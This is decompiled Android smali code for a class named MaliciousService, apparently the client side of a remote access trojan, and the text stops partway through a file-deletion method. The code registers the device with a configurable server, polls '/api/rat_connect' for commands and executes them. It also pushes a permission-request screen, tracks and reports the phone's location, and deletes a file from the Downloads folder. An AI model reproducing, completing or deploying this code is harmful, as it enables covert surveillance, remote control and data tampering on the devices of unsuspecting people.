.class public Lcom/example/android/MaliciousService;
.super Landroid/app/Service;
.source "MaliciousService.java"


# static fields
.field private static final CHANNEL_ID:Ljava/lang/String; = "MaliciousServiceChannel"

.field private static final COMMAND_CHECK_INTERVAL:Ljava/lang/String; = "15000"

.field private static final DEVICE_ID_KEY:Ljava/lang/String; = "device_id"

.field private static final FLASK_PORT_PREF_KEY:Ljava/lang/String; = "flask_port"

.field private static final LOCATION_UPDATE_DISTANCE:Ljava/lang/String; = "50.0f"

.field private static final LOCATION_UPDATE_INTERVAL:Ljava/lang/String; = "120000"

.field private static final MAIN_ACTIVITY_NAME:Ljava/lang/String; = "com.example.android.MainActivity"

.field private static final PERMISSIONS_REQUESTED_KEY:Ljava/lang/String; = "permissions_requested"

.field private static final PERMISSION_REQUEST_ACTIVITY_NAME:Ljava/lang/String; = "com.example.android.PermissionRequestActivity"

.field private static final PREFS_NAME:Ljava/lang/String; = "RAT_DEVICE_PREFS"

.field private static final RAT_PORT_PREF_KEY:Ljava/lang/String; = "rat_port"

.field private static final SERVER_IP_PREF_KEY:Ljava/lang/String; = "server_ip"

.field private static final TAG:Ljava/lang/String; = "MaliciousService"


# instance fields
.field private FLASK_PORT:Ljava/lang/String;

.field private RAT_PORT:Ljava/lang/String;

.field private SERVER_IP:Ljava/lang/String;

.field private commandCheckRunnable:Ljava/lang/Runnable;

.field private executorService:Ljava/util/concurrent/ExecutorService;

.field private handler:Landroid/os/Handler;

.field private locationListener:Landroid/location/LocationListener;

.field private locationManager:Landroid/location/LocationManager;

.field private uniqueDeviceId:Ljava/lang/String;


# direct methods
.method public static synthetic $r8$lambda$5YMZCTt9iW2cpbkzXW7W9gui_1s(Lcom/example/android/MaliciousService;)Ljava/lang/Void;
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->lambda$executeCommand$2()Ljava/lang/Void;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic $r8$lambda$AJidVgp-EVWTW2JOgCyU9aEI2TU(Lcom/example/android/MaliciousService;)Ljava/lang/Void;
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->lambda$executeCommand$0()Ljava/lang/Void;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic $r8$lambda$Oef5fmxlj3MdzELdik_Ko7G7rEM(Lcom/example/android/MaliciousService;)Ljava/lang/Void;
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->lambda$executeCommand$4()Ljava/lang/Void;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic $r8$lambda$nQUxp8VEcTogax2riam6EZzgWMw(Lcom/example/android/MaliciousService;)Ljava/lang/Void;
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->lambda$executeCommand$3()Ljava/lang/Void;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic $r8$lambda$piDLuYuoiT3UNqGYXgWRimIbOVA(Lcom/example/android/MaliciousService;)Ljava/lang/Void;
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->lambda$executeCommand$5()Ljava/lang/Void;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic $r8$lambda$rnUPjz6c8_oEuSRsMoPHuG-kfAA(Lcom/example/android/MaliciousService;)Ljava/lang/Void;
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->lambda$executeCommand$6()Ljava/lang/Void;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic $r8$lambda$tdmE5L7S1kCTdR5xLoKJcLcZVlU(Lcom/example/android/MaliciousService;)Ljava/lang/Void;
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->lambda$executeCommand$1()Ljava/lang/Void;

    move-result-object p0

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgetFLASK_PORT(Lcom/example/android/MaliciousService;)Ljava/lang/String;
    .registers 1

    iget-object p0, p0, Lcom/example/android/MaliciousService;->FLASK_PORT:Ljava/lang/String;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgetSERVER_IP(Lcom/example/android/MaliciousService;)Ljava/lang/String;
    .registers 1

    iget-object p0, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgetexecutorService(Lcom/example/android/MaliciousService;)Ljava/util/concurrent/ExecutorService;
    .registers 1

    iget-object p0, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgethandler(Lcom/example/android/MaliciousService;)Landroid/os/Handler;
    .registers 1

    iget-object p0, p0, Lcom/example/android/MaliciousService;->handler:Landroid/os/Handler;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgetuniqueDeviceId(Lcom/example/android/MaliciousService;)Ljava/lang/String;
    .registers 1

    iget-object p0, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$mallPermissionsGranted(Lcom/example/android/MaliciousService;)Z
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result p0

    return p0
.end method

.method static bridge synthetic -$$Nest$mcheckAndRequestPermissions(Lcom/example/android/MaliciousService;)V
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->checkAndRequestPermissions()V

    return-void
.end method

.method static bridge synthetic -$$Nest$mcheckCommands(Lcom/example/android/MaliciousService;)V
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->checkCommands()V

    return-void
.end method

.method static bridge synthetic -$$Nest$mloadServerConfigFromPreferences(Lcom/example/android/MaliciousService;)V
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->loadServerConfigFromPreferences()V

    return-void
.end method

.method static bridge synthetic -$$Nest$mregisterDeviceWithServer(Lcom/example/android/MaliciousService;)V
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->registerDeviceWithServer()V

    return-void
.end method

.method static bridge synthetic -$$Nest$msendHeartbeat(Lcom/example/android/MaliciousService;)V
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->sendHeartbeat()V

    return-void
.end method

.method static bridge synthetic -$$Nest$msendLocation(Lcom/example/android/MaliciousService;Landroid/location/Location;)V
    .registers 2

    invoke-direct {p0, p1}, Lcom/example/android/MaliciousService;->sendLocation(Landroid/location/Location;)V

    return-void
.end method

.method public constructor <init>()V
    .registers 1

    .line 42
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private allPermissionsGranted()Z
    .registers 7

    .line 299
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    const/4 v2, 0x1

    if-ge v0, v1, :cond_8

    .line 300
    return v2

    .line 302
    :cond_8
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->getRequiredPermissions()[Ljava/lang/String;

    move-result-object v0

    array-length v1, v0

    const/4 v3, 0x0

    const/4 v4, 0x0

    :goto_f
    if-ge v4, v1, :cond_1d

    aget-object v5, v0, v4

    .line 303
    invoke-virtual {p0, v5}, Lcom/example/android/MaliciousService;->checkSelfPermission(Ljava/lang/String;)I

    move-result v5

    if-eqz v5, :cond_1a

    .line 304
    return v3

    .line 302
    :cond_1a
    add-int/lit8 v4, v4, 0x1

    goto :goto_f

    .line 307
    :cond_1d
    return v2
.end method

.method private buildNotification()Landroid/app/Notification;
    .registers 4

    .line 203
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_e

    .line 204
    new-instance v0, Landroid/app/Notification$Builder;

    const-string v1, "MaliciousServiceChannel"

    invoke-direct {v0, p0, v1}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_13

    .line 206
    :cond_e
    new-instance v0, Landroid/app/Notification$Builder;

    invoke-direct {v0, p0}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    .line 208
    :goto_13
    const-string v1, "Service Running"

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v1

    .line 209
    const-string v2, "Monitoring for commands..."

    invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v1

    .line 210
    const v2, 0x1080041

    invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    .line 211
    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    return-object v0
.end method

.method private checkAndRequestPermissions()V
    .registers 7

    .line 322
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    if-ge v0, v1, :cond_7

    .line 323
    return-void

    .line 325
    :cond_7
    const-string v0, "RAT_DEVICE_PREFS"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/example/android/MaliciousService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 326
    const-string v2, "permissions_requested"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v1

    .line 327
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v3

    const/4 v4, 0x1

    const-string v5, "MaliciousService"

    if-nez v3, :cond_3e

    if-nez v1, :cond_3e

    .line 328
    const-string v1, "Permissions not granted. Launching PermissionRequestActivity."

    invoke-static {v5, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 329
    new-instance v1, Landroid/content/Intent;

    const-class v3, Lcom/example/android/PermissionRequestActivity;

    invoke-direct {v1, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 330
    const/high16 v3, 0x10000000

    invoke-virtual {v1, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 331
    invoke-virtual {p0, v1}, Lcom/example/android/MaliciousService;->startActivity(Landroid/content/Intent;)V

    .line 332
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 333
    invoke-interface {v0, v2, v4}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 334
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    goto :goto_54

    .line 335
    :cond_3e
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v1

    if-eqz v1, :cond_54

    .line 336
    const-string v1, "All required permissions are granted."

    invoke-static {v5, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 337
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 338
    invoke-interface {v0, v2, v4}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 339
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    goto :goto_55

    .line 335
    :cond_54
    :goto_54
    nop

    .line 341
    :goto_55
    return-void
.end method

.method private checkCommands()V
    .registers 10

    .line 519
    const-string v0, "commands"

    iget-object v1, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    const-string v2, "MaliciousService"

    if-eqz v1, :cond_180

    iget-object v1, p0, Lcom/example/android/MaliciousService;->FLASK_PORT:Ljava/lang/String;

    if-eqz v1, :cond_180

    iget-object v1, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    if-nez v1, :cond_12

    goto/16 :goto_180

    .line 525
    :cond_12
    nop

    .line 527
    const/4 v1, 0x0

    :try_start_14
    new-instance v3, Ljava/net/URL;

    iget-object v4, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    iget-object v5, p0, Lcom/example/android/MaliciousService;->FLASK_PORT:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "http://"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, ":"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/api/rat_connect"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 528
    invoke-virtual {v3}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v3

    check-cast v3, Ljava/net/HttpURLConnection;
    :try_end_46
    .catch Ljava/io/IOException; {:try_start_14 .. :try_end_46} :catch_159
    .catch Lorg/json/JSONException; {:try_start_14 .. :try_end_46} :catch_157
    .catchall {:try_start_14 .. :try_end_46} :catchall_155

    .line 529
    :try_start_46
    const-string v1, "POST"

    invoke-virtual {v3, v1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 530
    const-string v1, "Content-Type"

    const-string v4, "application/json; charset=utf-8"

    invoke-virtual {v3, v1, v4}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 531
    const/4 v1, 0x1

    invoke-virtual {v3, v1}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 532
    const/16 v1, 0x2710

    invoke-virtual {v3, v1}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 533
    invoke-virtual {v3, v1}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 535
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 536
    const-string v4, "device_id"

    iget-object v5, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 537
    const-string v4, "device_type"

    sget-object v5, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 538
    const-string v4, "connection_type"

    const-string v5, "check_commands"

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 540
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4
    :try_end_7c
    .catch Ljava/io/IOException; {:try_start_46 .. :try_end_7c} :catch_152
    .catch Lorg/json/JSONException; {:try_start_46 .. :try_end_7c} :catch_150
    .catchall {:try_start_46 .. :try_end_7c} :catchall_14d

    .line 541
    :try_start_7c
    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    sget-object v5, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v1, v5}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/io/OutputStream;->write([B)V

    .line 542
    invoke-virtual {v4}, Ljava/io/OutputStream;->flush()V
    :try_end_8c
    .catchall {:try_start_7c .. :try_end_8c} :catchall_141

    .line 543
    if-eqz v4, :cond_91

    :try_start_8e
    invoke-virtual {v4}, Ljava/io/OutputStream;->close()V

    .line 545
    :cond_91
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v1

    .line 546
    const/16 v4, 0xc8

    if-ne v1, v4, :cond_125

    .line 547
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v1
    :try_end_9d
    .catch Ljava/io/IOException; {:try_start_8e .. :try_end_9d} :catch_152
    .catch Lorg/json/JSONException; {:try_start_8e .. :try_end_9d} :catch_150
    .catchall {:try_start_8e .. :try_end_9d} :catchall_14d

    .line 548
    :try_start_9d
    new-instance v4, Ljava/io/BufferedReader;

    new-instance v5, Ljava/io/InputStreamReader;

    invoke-direct {v5, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v4, v5}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :try_end_a7
    .catchall {:try_start_9d .. :try_end_a7} :catchall_119

    .line 549
    :try_start_a7
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 551
    :goto_ac
    invoke-virtual {v4}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v6

    if-eqz v6, :cond_b6

    .line 552
    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_ac

    .line 555
    :cond_b6
    new-instance v6, Lorg/json/JSONObject;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v6, v5}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 556
    invoke-virtual {v6, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_106

    .line 557
    invoke-virtual {v6, v0}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v0

    .line 558
    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v5

    if-lez v5, :cond_106

    .line 559
    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v5

    iget-object v6, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "Received "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v7, " commands for device "

    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 560
    const/4 v5, 0x0

    :goto_f6
    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v6

    if-ge v5, v6, :cond_106

    .line 561
    invoke-virtual {v0, v5}, Lorg/json/JSONArray;->getString(I)Ljava/lang/String;

    move-result-object v6

    .line 562
    invoke-direct {p0, v6}, Lcom/example/android/MaliciousService;->executeCommand(Ljava/lang/String;)V
    :try_end_103
    .catchall {:try_start_a7 .. :try_end_103} :catchall_10f

    .line 560
    add-int/lit8 v5, v5, 0x1

    goto :goto_f6

    .line 566
    :cond_106
    :try_start_106
    invoke-virtual {v4}, Ljava/io/BufferedReader;->close()V
    :try_end_109
    .catchall {:try_start_106 .. :try_end_109} :catchall_119

    if-eqz v1, :cond_10e

    :try_start_10b
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
    :try_end_10e
    .catch Ljava/io/IOException; {:try_start_10b .. :try_end_10e} :catch_152
    .catch Lorg/json/JSONException; {:try_start_10b .. :try_end_10e} :catch_150
    .catchall {:try_start_10b .. :try_end_10e} :catchall_14d

    .line 547
    :cond_10e
    goto :goto_13b

    :catchall_10f
    move-exception v0

    :try_start_110
    invoke-virtual {v4}, Ljava/io/BufferedReader;->close()V
    :try_end_113
    .catchall {:try_start_110 .. :try_end_113} :catchall_114

    goto :goto_118

    :catchall_114
    move-exception v4

    :try_start_115
    invoke-static {v0, v4}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :goto_118
    throw v0
    :try_end_119
    .catchall {:try_start_115 .. :try_end_119} :catchall_119

    :catchall_119
    move-exception v0

    if-eqz v1, :cond_124

    :try_start_11c
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
    :try_end_11f
    .catchall {:try_start_11c .. :try_end_11f} :catchall_120

    goto :goto_124

    :catchall_120
    move-exception v1

    :try_start_121
    invoke-static {v0, v1}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :cond_124
    :goto_124
    throw v0

    .line 568
    :cond_125
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Flask server responded with non-OK code for commands: "

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_13b
    .catch Ljava/io/IOException; {:try_start_121 .. :try_end_13b} :catch_152
    .catch Lorg/json/JSONException; {:try_start_121 .. :try_end_13b} :catch_150
    .catchall {:try_start_121 .. :try_end_13b} :catchall_14d

    .line 573
    :goto_13b
    if-eqz v3, :cond_179

    .line 574
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->disconnect()V

    goto :goto_179

    .line 540
    :catchall_141
    move-exception v0

    if-eqz v4, :cond_14c

    :try_start_144
    invoke-virtual {v4}, Ljava/io/OutputStream;->close()V
    :try_end_147
    .catchall {:try_start_144 .. :try_end_147} :catchall_148

    goto :goto_14c

    :catchall_148
    move-exception v1

    :try_start_149
    invoke-static {v0, v1}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :cond_14c
    :goto_14c
    throw v0
    :try_end_14d
    .catch Ljava/io/IOException; {:try_start_149 .. :try_end_14d} :catch_152
    .catch Lorg/json/JSONException; {:try_start_149 .. :try_end_14d} :catch_150
    .catchall {:try_start_149 .. :try_end_14d} :catchall_14d

    .line 573
    :catchall_14d
    move-exception v0

    move-object v1, v3

    goto :goto_17a

    .line 570
    :catch_150
    move-exception v0

    goto :goto_153

    :catch_152
    move-exception v0

    :goto_153
    move-object v1, v3

    goto :goto_15a

    .line 573
    :catchall_155
    move-exception v0

    goto :goto_17a

    .line 570
    :catch_157
    move-exception v0

    goto :goto_15a

    :catch_159
    move-exception v0

    .line 571
    :goto_15a
    :try_start_15a
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Failed to check commands with Flask server: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_174
    .catchall {:try_start_15a .. :try_end_174} :catchall_155

    .line 573
    if-eqz v1, :cond_179

    .line 574
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 577
    :cond_179
    :goto_179
    return-void

    .line 573
    :goto_17a
    if-eqz v1, :cond_17f

    .line 574
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 576
    :cond_17f
    throw v0

    .line 520
    :cond_180
    :goto_180
    const-string v0, "Server configuration or device ID not loaded, skipping command check."

    invoke-static {v2, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 521
    return-void
.end method

.method private createNotificationChannel()V
    .registers 5

    .line 188
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_1d

    .line 189
    new-instance v0, Landroid/app/NotificationChannel;

    const-string v1, "Foreground Service Channel"

    const/4 v2, 0x2

    const-string v3, "MaliciousServiceChannel"

    invoke-direct {v0, v3, v1, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 194
    const-class v1, Landroid/app/NotificationManager;

    invoke-virtual {p0, v1}, Lcom/example/android/MaliciousService;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    .line 195
    if-eqz v1, :cond_1d

    .line 196
    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 199
    :cond_1d
    return-void
.end method

.method private deleteFile()V
    .registers 5

    .line 716
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v0

    const-string v1, "MaliciousService"

    if-nez v0, :cond_11

    .line 717
    const-string v0, "Cannot delete file: Permissions not granted."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 718
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->checkAndRequestPermissions()V

    .line 719
    return-void

    .line 721
    :cond_11
    const-string v0, "Simulating file deletion..."

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 722
    sget-object v0, Landroid/os/Environment;->DIRECTORY_DOWNLOADS:Ljava/lang/String;

    invoke-static {v0}, Landroid/os/Environment;->getExternalStoragePublicDirectory(Ljava/lang/String;)Ljava/io/File;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "/downloaded_sample.txt"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 723
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 724
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v3

    if-eqz v3, :cond_72

    .line 725
    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    move-result v2

    if-eqz v2, :cond_5b

    .line 726
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "File deleted successfully: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_88

    .line 728
    :cond_5b
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Failed to delete file: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_88

    .line 731
    :cond_72
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "File does not exist for deletion: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

